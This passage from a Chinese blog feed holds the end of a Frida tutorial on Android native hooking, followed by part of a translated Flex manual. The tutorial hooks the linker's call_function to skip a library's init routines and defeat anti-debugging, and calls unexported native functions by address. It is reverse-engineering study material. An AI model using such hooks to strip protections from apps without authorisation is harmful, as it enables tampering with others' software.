class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> F&gt;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">call_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* array_name __unused,</span></span></span><br><span class="line"><span class="function"><span class="params">                       F* functions,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">bool</span> reverse,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">const</span> <span class="keyword">char</span>* realpath)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (functions == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  TRACE(<span class="string">"[ Calling %s (size %zd) @ %p for '%s' ]"</span>, array_name, count, functions, realpath);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">begin</span> = reverse ? (count - <span class="number">1</span>) : <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">end</span> = reverse ? <span class="number">-1</span> : count;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">step</span> = reverse ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="built_in">begin</span>; i != <span class="built_in">end</span>; i += <span class="built_in">step</span>) &#123;</span><br><span class="line">    TRACE(<span class="string">"[ %s[%d] == %p ]"</span>, array_name, i, functions[i]);</span><br><span class="line">    call_function(<span class="string">"function"</span>, functions[i], realpath);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  TRACE(<span class="string">"[ Done calling %s for '%s' ]"</span>, array_name, realpath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LogPrint</span>(<span class="params">log</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> theDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> hour = theDate.getHours();</span><br><span class="line">    <span class="keyword">var</span> minute = theDate.getMinutes();</span><br><span class="line">    <span class="keyword">var</span> second = theDate.getSeconds();</span><br><span class="line">    <span class="keyword">var</span> mSecond = theDate.getMilliseconds()</span><br><span class="line"></span><br><span class="line">    hour &lt; <span class="number">10</span> ? hour = <span class="string">"0"</span> + hour : hour;</span><br><span class="line">    minute &lt; <span class="number">10</span> ? minute = <span class="string">"0"</span> + minute : minute;</span><br><span class="line">    second &lt; <span class="number">10</span> ? second = <span class="string">"0"</span> + second : second;</span><br><span class="line">    mSecond &lt; <span class="number">10</span> ? mSecond = <span class="string">"00"</span> + mSecond : mSecond &lt; <span class="number">100</span> ? mSecond = <span class="string">"0"</span> + mSecond : mSecond;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> time = hour + <span class="string">":"</span> + minute + <span class="string">":"</span> + second + <span class="string">":"</span> + mSecond;</span><br><span class="line">    <span class="keyword">var</span> threadid = Process.getCurrentThreadId();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"["</span> + time + <span class="string">"]"</span> + <span class="string">"-&gt;threadid:"</span> + threadid + <span class="string">"--"</span> + log);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hooklinker</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> linkername = <span class="string">"linker"</span>;</span><br><span class="line">    <span class="keyword">var</span> call_function_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> arch = Process.arch;</span><br><span class="line">    LogPrint(<span class="string">"Process run in:"</span> + arch);</span><br><span class="line">    <span class="keyword">if</span> (arch.endsWith(<span class="string">"arm"</span>)) &#123;</span><br><span class="line">        linkername = <span class="string">"linker"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        linkername = <span class="string">"linker64"</span>;</span><br><span class="line">        LogPrint(<span class="string">"arm64 is not supported yet!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> symbols = Module.enumerateSymbolsSync(linkername);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="comment">//LogPrint(linkername + "-&gt;" + symbol.name + "---" + symbol.address);</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"__dl__ZL13call_functionPKcPFviPPcS2_ES0_"</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">            call_function_addr = symbol.address;</span><br><span class="line">            LogPrint(<span class="string">"linker-&gt;"</span> + symbol.name + <span class="string">"---"</span> + symbol.address)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (call_function_addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> func_call_function = <span class="keyword">new</span> NativeFunction(call_function_addr, <span class="string">'void'</span>, [<span class="string">'pointer'</span>, <span class="string">'pointer'</span>, <span class="string">'pointer'</span>]);</span><br><span class="line">        Interceptor.replace(<span class="keyword">new</span> NativeFunction(call_function_addr,</span><br><span class="line">            <span class="string">'void'</span>, [<span class="string">'pointer'</span>, <span class="string">'pointer'</span>, <span class="string">'pointer'</span>]), <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1, arg2</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> functiontype = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">var</span> functionaddr = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">var</span> sopath = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                functiontype = Memory.readCString(arg0);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (arg1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                functionaddr = arg1;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (arg2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                sopath = Memory.readCString(arg2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> modulebaseaddr = Module.findBaseAddress(sopath);</span><br><span class="line">            LogPrint(<span class="string">"after load:"</span> + sopath + <span class="string">"--start call_function,type:"</span> + functiontype + <span class="string">"--addr:"</span> + functionaddr + <span class="string">"---baseaddr:"</span> + modulebaseaddr);</span><br><span class="line">            <span class="keyword">if</span> (sopath.indexOf(<span class="string">'libnative-lib.so'</span>) &gt;= <span class="number">0</span> &amp;&amp; functiontype == <span class="string">"DT_INIT"</span>) &#123;</span><br><span class="line">                LogPrint(<span class="string">"after load:"</span> + sopath + <span class="string">"--ignore call_function,type:"</span> + functiontype + <span class="string">"--addr:"</span> + functionaddr + <span class="string">"---baseaddr:"</span> + modulebaseaddr);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                func_call_function(arg0, arg1, arg2);</span><br><span class="line">                LogPrint(<span class="string">"after load:"</span> + sopath + <span class="string">"--end call_function,type:"</span> + functiontype + <span class="string">"--addr:"</span> + functionaddr + <span class="string">"---baseaddr:"</span> + modulebaseaddr);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="string">'void'</span>, [<span class="string">'pointer'</span>, <span class="string">'pointer'</span>, <span class="string">'pointer'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hooklinker)</span><br></pre></td></tr></table></figure><p>我调试了一下linker64，因为没有导出call_function的地址，所以不能直接hook符号名，而是要根据偏移去hook，以后再说。<br>其实要看<code>init_array</code>，直接shift+F7去segment里面找<code>.init_array</code>段就可以了，这里主要是为了反反调试，因为可能反调试会加在init_array里，hook call_function就可以让它不加载反调试程序。</p><h3 id="native层未导出函数主动调用（任意符号和地址）"><a href="#native层未导出函数主动调用（任意符号和地址）" class="headerlink" title="native层未导出函数主动调用（任意符号和地址）"></a>native层未导出函数主动调用（任意符号和地址）</h3><p>现在我想要主动调用sakura_add来打印值,可以ida打开找符号，或者根据偏移，总之最终用这个NativePointer指针来初始化一个NativeFunction来调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line">Java_com_example_ndk_1demo_MainActivity_sakuraWithInt(JNIEnv *env, jobject thiz, jint a, jint b) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement sakuraWithInt()</span></span><br><span class="line">    <span class="keyword">return</span> sakura_add(a,b);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sakura_add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = a+b;</span><br><span class="line">    LOGD(<span class="string">"sakura add a+b:"</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-142324.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libnative_lib_addr = Module.findBaseAddress(<span class="string">"libnative-lib.so"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"libnative_lib_addr is :"</span>, libnative_lib_addr);</span><br><span class="line">    <span class="keyword">if</span> (libnative_lib_addr) &#123;</span><br><span class="line">        <span class="keyword">var</span> sakura_add_addr1 = Module.findExportByName(<span class="string">"libnative-lib.so"</span>, <span class="string">"_Z10sakura_addii"</span>);</span><br><span class="line">        <span class="keyword">var</span> sakura_add_addr2 = libnative_lib_addr.add(<span class="number">0x0F56C</span>) ;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"sakura_add_addr1 "</span>, sakura_add_addr1);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"sakura_add_addr2 "</span>, sakura_add_addr2)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sakura_add1 = <span class="keyword">new</span> NativeFunction(sakura_add_addr1, <span class="string">"int"</span>, [<span class="string">"int"</span>, <span class="string">"int"</span>]);</span><br><span class="line">    <span class="keyword">var</span> sakura_add2 = <span class="keyword">new</span> NativeFunction(sakura_add_addr2, <span class="string">"int"</span>, [<span class="string">"int"</span>, <span class="string">"int"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"sakura_add1 result is :"</span>, sakura_add1(<span class="number">200</span>, <span class="number">33</span>));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"sakura_add2 result is :"</span>, sakura_add2(<span class="number">100</span>, <span class="number">133</span>));</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main())</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">libnative_lib_addr is : <span class="number">0x79fa1c5000</span></span><br><span class="line">sakura_add_addr1  <span class="number">0x79fa1d456c</span></span><br><span class="line">sakura_add_addr2  <span class="number">0x79fa1d456c</span></span><br><span class="line">sakura_add1 result is : <span class="number">233</span></span><br><span class="line">sakura_add2 result is : <span class="number">233</span></span><br></pre></td></tr></table></figure><h2 id="C-C-hook"><a href="#C-C-hook" class="headerlink" title="C/C++ hook"></a>C/C++ hook</h2><p>//todo</p><h3 id="Native-JNI层参数打印和主动调用参数构造"><a href="#Native-JNI层参数打印和主动调用参数构造" class="headerlink" title="Native/JNI层参数打印和主动调用参数构造"></a>Native/JNI层参数打印和主动调用参数构造</h3><p>jni的基本类型要通过调用jni相关的api转化成c++对象，才能打印和调用。<br>jni主动调用的时候，参数构造有两种方式，一种是<code>Java.vm.getenv</code>，另一种是hook获取env之后来调用jni相关的api构造参数。</p><h3 id="C-C-编成so并引入Frida调用其中的函数"><a href="#C-C-编成so并引入Frida调用其中的函数" class="headerlink" title="C/C++编成so并引入Frida调用其中的函数"></a>C/C++编成so并引入Frida调用其中的函数</h3><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>本篇文章学到的内容来自且完全来自r0ysue的知识星球，推荐一下。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-07-061015.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;建了一个知识星球：天问之路&quot;&gt;&lt;a href=&quot;#建了一个知识星球：天问之路&quot; class=&quot;headerlink&quot; title=&quot;建了一个知识星球：天问之路&quot;&gt;&lt;/a&gt;建了一个知识星球：天问之路&lt;/h2&gt;&lt;p&gt;如果想学习二进制安全，或者和我交流，欢迎来这里找我w
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="http://eternalsakura13.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
      <category term="frida" scheme="http://eternalsakura13.com/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>Flex中文文档</title>
    <link href="http://eternalsakura13.com/2020/05/27/flex/"/>
    <id>http://eternalsakura13.com/2020/05/27/flex/</id>
    <published>2020-05-27T15:37:03.324Z</published>
    <updated>2020-05-28T10:05:15.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="4-Some-Simple-Examples"><a href="#4-Some-Simple-Examples" class="headerlink" title="4 Some Simple Examples"></a>4 Some Simple Examples</h2><p>首先，通过一些简单的示例来了解使用flex。<br>以下flex输入指定了一个扫描程序scanner，当它遇到字符串’username’将其替换为用户的登录名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">username    printf( &quot;%s&quot;, getlogin() );</span><br></pre></td></tr></table></figure><p>默认情况下，任何与flex scanner不匹配的文本都将被复制到输出中，因此，该scanner的最终效果是仅将每次出现的用户名替换了。<br>在此输入中，只有一个规则(rule)。’username’是模式(pattern)，而’print’就是action。’%%’符号标志着rules的开始。<br>另一个简单的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        int num_lines &#x3D; 0, num_chars &#x3D; 0;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">\n      ++num_lines; ++num_chars;</span><br><span class="line">.       ++num_chars;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">        &#123;</span><br><span class="line">        yylex();</span><br><span class="line">        printf( &quot;# of lines &#x3D; %d, # of chars &#x3D; %d\n&quot;,</span><br><span class="line">                num_lines, num_chars );</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>该scanner计算其输入中的字符数和行数。除了有关字符数和行数的最终报告外，它不产生任何输出。<br>第一行声明了两个全局变量，num_lines和num_chars，在第二个%%之后声明的yylex()的main()例程都可以访问它们。<br>有两个规则(rule)，一个匹配换行符(‘\n’)，并同时增加行数和字符数。<br>另一个匹配除了换行符之外的任何字符(通过.正则表达式)</p><p>看一个更复杂的例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* scanner for a toy Pascal-like language *&#x2F;</span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line">&#x2F;* need this for the call to atof() below *&#x2F;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">DIGIT    [0-9]</span><br><span class="line">ID       [a-z][a-z0-9]*</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&#123;DIGIT&#125;+    &#123;</span><br><span class="line">            printf( &quot;An integer: %s (%d)\n&quot;, yytext,</span><br><span class="line">                    atoi( yytext ) );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#123;DIGIT&#125;+&quot;.&quot;&#123;DIGIT&#125;*        &#123;</span><br><span class="line">            printf( &quot;A float: %s (%g)\n&quot;, yytext,</span><br><span class="line">                    atof( yytext ) );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">if|then|begin|end|procedure|function        &#123;</span><br><span class="line">            printf( &quot;A keyword: %s\n&quot;, yytext );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#123;ID&#125;        printf( &quot;An identifier: %s\n&quot;, yytext );</span><br><span class="line"></span><br><span class="line">&quot;+&quot;|&quot;-&quot;|&quot;*&quot;|&quot;&#x2F;&quot;   printf( &quot;An operator: %s\n&quot;, yytext );</span><br><span class="line"></span><br><span class="line">&quot;&#123;&quot;[^&#123;&#125;\n]*&quot;&#125;&quot;     &#x2F;* eat up one-line comments *&#x2F;</span><br><span class="line"></span><br><span class="line">[ \t\n]+          &#x2F;* eat up whitespace *&#x2F;</span><br><span class="line"></span><br><span class="line">.           printf( &quot;Unrecognized character: %s\n&quot;, yytext );</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">int main( int argc, char **argv )</span><br><span class="line">    &#123;</span><br><span class="line">    ++argv, --argc;  &#x2F;* skip over program name *&#x2F;</span><br><span class="line">    if ( argc &gt; 0 )</span><br><span class="line">            yyin &#x3D; fopen( argv[0], &quot;r&quot; );</span><br><span class="line">    else</span><br><span class="line">            yyin &#x3D; stdin;</span><br><span class="line"></span><br><span class="line">    yylex();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是针对Pascal等语言的简单scanner的开始。它标识不同类型的token并报告所见内容。<br>以下部分将说明此示例的详细信息。</p><h2 id="5-Format-of-the-Input-File"><a href="#5-Format-of-the-Input-File" class="headerlink" title="5 Format of the Input File"></a>5 Format of the Input File</h2><p>flex输入文件包括三部分，由%%分开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">definitions</span><br><span class="line">%%</span><br><span class="line">rules</span><br><span class="line">%%</span><br><span class="line">user code</span><br></pre></td></tr></table></figure><h3 id="5-1-Format-of-the-Definitions-Section"><a href="#5-1-Format-of-the-Definitions-Section" class="headerlink" title="5.1 Format of the Definitions Section"></a>5.1 Format of the Definitions Section</h3><p>该定义部分包含了简单的Name definitions的声明，以及start conditions的声明，这将在后面的章节解释。<br>Name definitions有如下形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name definition</span><br></pre></td></tr></table></figure><p>name是一个以字母或下划线开头的单词，然后是零个或多个字母，数字，’_’，或者’-‘(破折号)。<br>definition从名称后的第一个非空白字符开始，一直到该行的末尾。该definition随后可以使用{definition}，它将扩展为(definition)。例如，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DIGIT    [0-9]</span><br><span class="line">ID       [a-z][a-z0-9]*</span><br></pre></td></tr></table></figure><p>定义“数字“是与一位数字匹配的正则表达式，而’ID’是一个正则表达式，它匹配一个字母，后跟零个或多个字母及数字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;DIGIT&#125;+&quot;.&quot;&#123;DIGIT&#125;*</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([0-9])+&quot;.&quot;([0-9])*</span><br></pre></td></tr></table></figure><p>其可以匹配一个或多个数字，后跟一个’.’,然后跟零个或多个数字。12.34<br>不缩进的注释(以<code>/*</code>开头的行)逐字复制到输出，直到遇到下一个<code>*/</code>。<br>任何缩进文本，或者包括在<code>%{</code>和<code>%}</code>之中的也将逐字复制到输出中(移除<code>%{和%}</code>符号)，<code>％{和％}</code>符号本身必须在行上没有缩进。<br><code>%top</code>块是类似于<code>%{和}%</code>的，但它将块中的代码重定位到生成的文件的顶部(在所有flex定义之前)，<code>%top</code>在当您要定义某些预处理器宏或在生成的代码之前包含某些文件时，该块很有用。单个字符<code>{</code>和<code>}</code>用于分隔<code>%top</code>块，如以下示例所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%top&#123;</span><br><span class="line">    &#x2F;* This code goes at the &quot;top&quot; of the generated file. *&#x2F;</span><br><span class="line">    #include &lt;stdint.h&gt;</span><br><span class="line">    #include &lt;inttypes.h&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>%top</code>允许多个块，并保留其顺序。</p><h3 id="5-2-Format-of-the-Rules-Section"><a href="#5-2-Format-of-the-Rules-Section" class="headerlink" title="5.2 Format of the Rules Section"></a>5.2 Format of the Rules Section</h3><p>Flex输入的 rules section 对以下表格有一系列的规则： </p><table><thead><tr><th>pattern</th><th>action</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>其中 pattern 必须是不缩进的，action 必须开始在同一行。 有关 patterns 和 actions 的进一步描述，请参见Patterns。 </p><p>在rules section中，出现在第一个rule之前的任何缩进或<code>%{ %}</code>括号内的文本都可用于声明scanning routine的局部变量和每次进入scanning routine时执行的(声明之后的)代码。<br>rules section中的其他缩进文本或<code>%{ %}</code>文本仍然复制到输出中，但其含义没有良好定义，并且很可能导致编译时错误(这个特性是为了符合 POSIX 要求。查看 Lex 和 Posix，以获得其他此类特性)。 </p><p> <code>%{</code> 和 <code>%}</code>中包含的任何缩进文本或文本都会被逐字复制到输出中(删除了<code>%{</code>和<code>%}</code>符号)。 <code>%{</code>和<code>%}</code>符号本身必须在该行没有缩进。 </p><h3 id="5-3-Format-of-the-User-Code-Section"><a href="#5-3-Format-of-the-User-Code-Section" class="headerlink" title="5.3 Format of the User Code Section"></a>5.3 Format of the User Code Section</h3><p>用户代码部分仅逐字复制到lex.yy.c。它作为scanner的辅助函数使用。此部分的出现是可选的；如果不存在，则输入文件中的第二个”%%”可以被省略。</p><h3 id="5-4-Comments-in-the-Input"><a href="#5-4-Comments-in-the-Input" class="headerlink" title="5.4 Comments in the Input"></a>5.4 Comments in the Input</h3><p>Flex支持C风格的注释，即：介于<code>/ *</code>和<code>* /</code>之间的任何内容都被认为是注释。Flex遇到注释时，会将整个注释逐字复制到生成的源代码中。注释可能出现在任何地方，但有以下例外情况：</p><ul><li>在需要正则表达式的 flex 中，注释可能不会出现在 Rules 部分。 即：注释可能不会出现在一行的开头，或紧跟在scanner states列表之后。 </li><li>注释不能出现在 Definitions 部分的<code>%option</code>行上。</li></ul><p>如果您希望遵循一个简单的规则，那么始终在新行上开始注释，在开始的<code>/*</code>之前使用一个或多个空格字符。 此规则适用于输入文件的任何位置。下面例子中的所有注释都是有效的: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">&#x2F;* code block *&#x2F;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Definitions Section *&#x2F;</span><br><span class="line">%x STATE_X</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">    &#x2F;* Rules Section *&#x2F;</span><br><span class="line">ruleA   &#x2F;* after regex *&#x2F; &#123; &#x2F;* code block *&#x2F; &#125; &#x2F;* after code block *&#x2F;</span><br><span class="line">        &#x2F;* Rules Section (indented) *&#x2F;</span><br><span class="line">&lt;STATE_X&gt;&#123;</span><br><span class="line">ruleC   ECHO;</span><br><span class="line">ruleD   ECHO;</span><br><span class="line">%&#123;</span><br><span class="line">&#x2F;* code block *&#x2F;</span><br><span class="line">%&#125;</span><br><span class="line">&#125;</span><br><span class="line">%%</span><br><span class="line">&#x2F;* User Code Section *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="6-patterns"><a href="#6-patterns" class="headerlink" title="6 patterns"></a>6 patterns</h2><p> 输入里的patterns是根据一个正则表达式扩展集合来写的:</p><ul><li><p><code>x</code>:  </p><p>  匹配字符<code>x</code></p></li><li><p><code>.</code>:  </p><p>  匹配任意字符(1字节)，除了换行符</p></li><li><p><code>[xyz]</code>:  </p><p>  单个字符类;在该case，表示匹配x或y或z</p></li><li><p><code>[abj-oZ]</code>: 